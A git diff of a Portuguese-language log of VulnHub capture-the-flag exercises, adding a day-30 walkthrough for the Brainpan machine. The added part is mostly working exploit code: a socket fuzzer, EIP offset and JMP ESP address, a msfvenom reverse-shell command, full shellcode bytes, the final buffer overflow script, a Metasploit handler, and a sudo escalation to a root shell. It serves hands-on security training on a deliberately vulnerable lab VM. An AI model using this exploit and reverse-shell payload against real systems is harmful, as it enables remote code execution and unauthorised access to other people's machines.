@@ -17,7 +17,7 @@ Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
 Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
 Desafio 16 - https://www.vulnhub.com/entry/symfonos-31,332/</br>
 Desafio 17 - Manual Webmin 1.920 exploit | CVE-2019-15107 | Crontab - https://www.vulnhub.com/entry/nezuko-1,352/ </br>
-Desafio 18 - CWE-521 | Tomcat7 bad .jsp | CWE-732 crontab  	    - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
+Desafio 18 - CWE-521 | Tomcat7 bad .jsp | CWE-732 crontab  	  - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
 Desafio 19 - Parameter Fuzzing | Password Spray | CVE-2017-16995 - https://www.vulnhub.com/entry/prime-1,358/</br>
 Desafio 20 - IDT 'perf_swevent_init' Local Privilege Escalation - https://www.vulnhub.com/entry/sumo-1,480/ </br>
 Desafio 21 - Solar Winds Serv-U - CVE-2019-12181 | SQLI into dumpfile - https://www.vulnhub.com/entry/election-1,503/ </br>
@@ -29,7 +29,7 @@ Desafio 26 - RCE to DMZ machine | Pivoting with NC | DNS zone transfer | MDNS po
 Desafio 27 - Buffer Overflow INTRO - https://www.vulnhub.com/entry/covfefe-1,199/ </br>
 Desafio 28 - XXE server-side request forgery | BoF Ret2Libc // Buffer Overglow Ret2Libc Exploit development - https://www.vulnhub.com/entry/jigsaw-1,310/</br>
 Desafio 29 - Format String Attack | Exploit Development - https://www.vulnhub.com/entry/pegasus-1,109/ </br>
-Desafio 30 - - https://www.vulnhub.com/entry/brainpan-1,51/</br>
+Desafio 30 - Buffer Overflow Exploit Development - https://www.vulnhub.com/entry/brainpan-1,51/</br>
 <br/>**--VM--**
 
 <br> <h2>[Write-up vídeo](https://www.youtube.com/channel/UCnWSqlqL8D365ps5IECrPyg) </h2></br>
@@ -1636,3 +1636,168 @@ apt intall gdb
 							./becoxpl
 							 
 							root
+
+
+
+
+
+<h3>Dia 30 			6/10/2020</h3>
+
+	*instalar o https://www.immunityinc.com/products/debugger/ na vm  windows ->  vm windows 7/10 microsoft
+	*desativar firewall windows
+
+
+
+
+	*dirb http://192.168.100.37:10000/
+		#bin
+			download brainpan.exe 	↔  mandar para wind (use pasta compartilhada)
+			executar o brain
+			
+			kali: nc ip_vm 9999
+			confirmado a conexão, pode fechar e iniciar o Immunity Debugger
+			
+			*open brainpan.exe
+				*teclado - F9
+				
+			kali: nano fuzz-brain.py  (ATENÇÃO À INDENTAÇÃO)
+			
+			import socket
+
+			buffer=["A"]
+			c=100
+
+			while len(buffer) < 25:
+					buffer.append("A"*c)
+					c=c+200
+
+			for a in buffer:
+					print("[+] Testando: " + str(len(a)) + " bytes")
+					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+					s.connect(("192.168.100.38",9999))
+					s.send(a + "\r\n")
+					
+					
+				*kali: locate pattern_create
+					#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100
+				
+				nano xpl.py
+				
+				joga na variavel buffer
+				
+				import socket
+
+				buffer="resultado_pattern_aqui"
+
+				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+				s.connect(("192.168.100.38",9999))
+				s.send(buffer)
+				
+				
+			*Immunity Debugger
+				Ctrl+F2
+				F9
+							
+			kali: python xpl.py
+
+			*Immunity Debugger
+				#EIP: 35724134 
+				
+			kali: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
+				#524   ---IMPORTANTE
+
+			*Immunity Debugger		
+			menu-> e 
+				1° opção - name: brainpan
+					entrar nele ^^^^^
+						Ctrl+F
+						find comand
+							#JMP ESP
+							# 311712F3   ---IMPORTANTE
+
+	------------------------------------
+			kali: nano xpl.py
+			
+				import socket
+				#524
+				#311712F3 -> \xf3\x12\x17\x31
+
+
+				buffer="A"* 524 + "\xf3\x12\x17\x31" * 4 + "C" * 400
+
+				s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+				s.connect(("192.168.100.38",9999))
+				s.send(buffer)
+				
+				
+					
+	--------------------------------
+
+			kali: msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.22 lport=443 exitfunc=thread -f python -a x86 -b "\x00"
+								
+			nano xpl.py
+			
+			import socket
+
+			buf =  b""
+			buf += b"\xd9\xc5\xbf\xc9\x82\x5c\x87\xd9\x74\x24\xf4\x5d\x2b"
+			buf += b"\xc9\xb1\x52\x31\x7d\x17\x03\x7d\x17\x83\x24\x7e\xbe"
+			buf += b"\x72\x4a\x97\xbd\x7d\xb2\x68\xa2\xf4\x57\x59\xe2\x63"
+			buf += b"\x1c\xca\xd2\xe0\x70\xe7\x99\xa5\x60\x7c\xef\x61\x87"
+			buf += b"\x35\x5a\x54\xa6\xc6\xf7\xa4\xa9\x44\x0a\xf9\x09\x74"
+			buf += b"\xc5\x0c\x48\xb1\x38\xfc\x18\x6a\x36\x53\x8c\x1f\x02"
+			buf += b"\x68\x27\x53\x82\xe8\xd4\x24\xa5\xd9\x4b\x3e\xfc\xf9"
+			buf += b"\x6a\x93\x74\xb0\x74\xf0\xb1\x0a\x0f\xc2\x4e\x8d\xd9"
+			buf += b"\x1a\xae\x22\x24\x93\x5d\x3a\x61\x14\xbe\x49\x9b\x66"
+			buf += b"\x43\x4a\x58\x14\x9f\xdf\x7a\xbe\x54\x47\xa6\x3e\xb8"
+			buf += b"\x1e\x2d\x4c\x75\x54\x69\x51\x88\xb9\x02\x6d\x01\x3c"
+			buf += b"\xc4\xe7\x51\x1b\xc0\xac\x02\x02\x51\x09\xe4\x3b\x81"
+			buf += b"\xf2\x59\x9e\xca\x1f\x8d\x93\x91\x77\x62\x9e\x29\x88"
+			buf += b"\xec\xa9\x5a\xba\xb3\x01\xf4\xf6\x3c\x8c\x03\xf8\x16"
+			buf += b"\x68\x9b\x07\x99\x89\xb2\xc3\xcd\xd9\xac\xe2\x6d\xb2"
+			buf += b"\x2c\x0a\xb8\x15\x7c\xa4\x13\xd6\x2c\x04\xc4\xbe\x26"
+			buf += b"\x8b\x3b\xde\x49\x41\x54\x75\xb0\x02\x9b\x22\xde\xc4"
+			buf += b"\x73\x31\x1e\xe8\x38\xbc\xf8\x80\x2e\xe9\x53\x3d\xd6"
+			buf += b"\xb0\x2f\xdc\x17\x6f\x4a\xde\x9c\x9c\xab\x91\x54\xe8"
+			buf += b"\xbf\x46\x95\xa7\x9d\xc1\xaa\x1d\x89\x8e\x39\xfa\x49"
+			buf += b"\xd8\x21\x55\x1e\x8d\x94\xac\xca\x23\x8e\x06\xe8\xb9"
+			buf += b"\x56\x60\xa8\x65\xab\x6f\x31\xeb\x97\x4b\x21\x35\x17"
+			buf += b"\xd0\x15\xe9\x4e\x8e\xc3\x4f\x39\x60\xbd\x19\x96\x2a"
+			buf += b"\x29\xdf\xd4\xec\x2f\xe0\x30\x9b\xcf\x51\xed\xda\xf0"
+			buf += b"\x5e\x79\xeb\x89\x82\x19\x14\x40\x07\x39\xf7\x40\x72"
+			buf += b"\xd2\xae\x01\x3f\xbf\x50\xfc\x7c\xc6\xd2\xf4\xfc\x3d"
+			buf += b"\xca\x7d\xf8\x7a\x4c\x6e\x70\x12\x39\x90\x27\x13\x68"
+
+			#524
+			#311712F3 -> \xf3\x12\x17\x31
+
+
+			buffer="A"*524 + "\xf3\x12\x17\x31" + "\x90" * 8 + buf
+
+			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			s.connect(("192.168.100.38",9999))
+			s.send(buffer)
+			
+			
+			
+			*windows -> pode fechar o Immunity Debugger
+				*abrir o brainpan.exe
+				
+				kali: nc 192.168.100.38 9999
+				
+					python xpl.py
+	
+			*Agora, executar na VM ALVO Brainpan
+			
+				kali: msfconsole
+				use multi/handler
+				set payload linux/x86/shell/reverse_tcp
+				
+				python xpl.py
+			
+			python -c 'import pty;pty.spawn("/bin/bash")'
+			sudo -l 
+			#/home/anansi/bin/ananci_util
+			sudo /home/anansi/bin/ananci_util  manual file
+			!/bin/bash
+			cat /root/b.txt
